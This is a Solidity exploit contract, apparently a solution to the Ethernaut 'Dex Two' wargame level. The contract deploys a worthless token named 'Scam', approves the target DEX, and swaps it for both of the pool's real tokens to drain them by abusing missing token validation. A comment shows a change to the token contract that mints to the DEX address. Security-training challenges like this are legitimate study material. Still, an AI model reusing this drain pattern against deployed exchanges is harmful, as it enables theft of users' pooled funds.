// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import { DexTwo, SwappableTokenTwo } from "./DexTwo.sol";
import "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract DexTwoAttack{
    DexTwo victim;
    SwappableTokenTwo maliciousToken;

    constructor(address _v) {
        victim = DexTwo(payable(_v));
        maliciousToken = new SwappableTokenTwo(0x37fd45D52Fe9E6c9B83Cf038307FB6D9EB915376, "Scam", "SCAM", 400);
        maliciousToken.approve(address(victim), 300);
        victim.swap(address(maliciousToken), victim.token1(), 100);
        victim.swap(address(maliciousToken), victim.token2(), 200);
    }
} 


// i added this in the token contract

// contract SwappableTokenTwo is ERC20 {
//     address private _dex;

//     constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
//         ERC20(name, symbol)
//     {
//         _mint(msg.sender, initialSupply);
//++++++   _mint(0x37fd45D52Fe9E6c9B.... dex address, 100); ++++++++
//         _dex = dexInstance;
//     }
